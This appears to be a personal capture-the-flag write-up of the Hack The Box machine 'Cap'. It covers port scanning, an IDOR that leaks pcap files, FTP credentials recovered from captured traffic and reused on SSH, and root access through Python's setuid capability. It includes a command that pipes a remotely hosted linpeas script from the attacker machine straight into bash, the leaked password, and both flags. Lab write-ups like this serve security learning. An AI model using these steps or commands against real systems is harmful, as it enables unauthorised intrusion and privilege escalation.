---
title: "Cap"
date: 2026-05-02
slug: cap
tags: [hackthebox, linux, web, privesc]
difficulty: Easy
---
A writeup for the CTF CAP -  [CAP](https://app.hackthebox.com/machines/Cap)

---

# Reconnaissance


```
 @dedfish  rustscan -a 10.129.27.195 -- -sC -sV


Open 10.129.27.195:22
Open 10.129.27.195:21
Open 10.129.27.195:80


PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2vrva1a+HtV5SnbxxtZSs+D8/EXPL2wiqOUG2ngq9zaPlF6cuLX3P2QYvGfh5bcAIVjIqNUmmc1eSHVxtbmNEQjyJdjZOP4i2IfX/RZUA18dWTfEWlNaoVDGBsc8zunvFk3nkyaynnXmlH7n3BLb1nRNyxtouW+q7VzhA6YK3ziOD6tXT7MMnDU7CfG1PfMqdU297OVP35BODg1gZawthjxMi5i5R1g3nyODudFoWaHu9GZ3D/dSQbMAxsly98L1Wr6YJ6M6xfqDurgOAl9i6TZ4zx93c/h1MO+mKH7EobPR/ZWrFGLeVFZbB6jYEflCty8W8Dwr7HOdF1gULr+Mj+BcykLlzPoEhD7YqjRBm8SHdicPP1huq+/3tN7Q/IOf68NNJDdeq6QuGKh1CKqloT/+QZzZcJRubxULUg8YLGsYUHd1umySv4cHHEXRl7vcZJst78eBqnYUtN3MweQr4ga1kQP4YZK5qUQCTPPmrKMa9NPh1sjHSdS8IwiH12V0=
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDqG/RCH23t5Pr9sw6dCqvySMHEjxwCfMzBDypoNIMIa8iKYAe84s/X7vDbA9T/vtGDYzS+fw8I5MAGpX8deeKI=
|   256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPbLTiQl+6W0EOi8vS+sByUiZdBsuz0v/7zITtSuaTFH
80/tcp open  http    syn-ack Gunicorn
|_http-title: Security Dashboard
|_http-server-header: gunicorn
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel


```

**http check** - 
we see that **gunicorn** is running on the http server which is used for python apps so this can be using frameworks like flask or django 
django - has a /admin page by default we can check if it is not there its flask
it did not have a admin page so we are working with **flask** here  
flask is minimal and django is feature rich 

there are 3 tabs on the website 

/data/5 - hosts a pcap file of 5 sec activity 
![[Pasted image 20260502024806.png]]

ip - executes a ip addr command and gives output 
![[Pasted image 20260502024931.png]]

netstat - executes a netstat command 
![[Pasted image 20260502025009.png]]

there was no input option on the website so there is no chance of looking for command injection and also url injection was not possible 
the pages are not static because when we refresh the netstat page we can see the real time output of the server 








---

#  Findings(credentials, services, vulnerabilities)



`http://10.129.27.195/data/0`
this URL has a IDOR vulnerability where changing the values at the end gives us different pcap files 

analyzing the pcap file downloaded from the website we found - 
file 0 has a FTP conversation where the user password is leaked 
```
220 (vsFTPd 3.0.3)

USER nathan

331 Please specify the password.

PASS Buck3tH4TF0RM3!

230 Login successful.
```

`uname - nathan
`pass - Buck3tH4TF0RM3!`


one other service that was running on this server is SSH and using the same password on SSH works and we get access to the SSH account of the user nathan 



---

# Exploitation

```

 @dedfish  ftp 10.129.27.195  
Connected to 10.129.27.195.
220 (vsFTPd 3.0.3)
Name (10.129.27.195:dedfish): nathan
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-r--------    1 1001     1001           33 May 01 14:43 user.txt
226 Directory send OK.
ftp> get user.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for user.txt (33 bytes).
226 Transfer complete.
33 bytes received in 0.0001 seconds (548.3879 kbytes/s)
ftp> 


 @dedfish  cat user.txt              
0964dabf0570d78483ccc2063f3a9cd5
```



---

# Privilege Escalation

hosting python server where we have linpeas file 
```
~/wind/ctf/scripts 
 @dedfish  python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

requesting the linpeas into the tmp folder of nathan 
```
nathan@cap:~$ curl 10.10.16.201:8000/linpeas.sh | bash
```
| bash - will directly run the script after downloading 

python was having capability of modifying uid - 
```
nathan@cap:~$ python3

>>> import os
>>> os.setuid(0)
>
>>> os.system("id")
uid=0(root) gid=1001(nathan) groups=1001(nathan)
0
>>> os.setuid(0)

>>> os.system("whoami")
root
0
>>> os.system("sh")
# ls
snap  user.txt
# cd /
# ls
bin  boot  cdrom  dev  etc  home  lib  lib32  lib64  libx32  lost+found  media	mnt  opt  proc	root  run  sbin  snap  srv  sys  tmp  usr  var
# cd root
# cat root.txt  
dc188c23db98583a63b00732e2dc7075
```

---

# mistakes and learning 
1. I can first look at the recon output and find out what am i working with what software supports other software to figure out more about the target
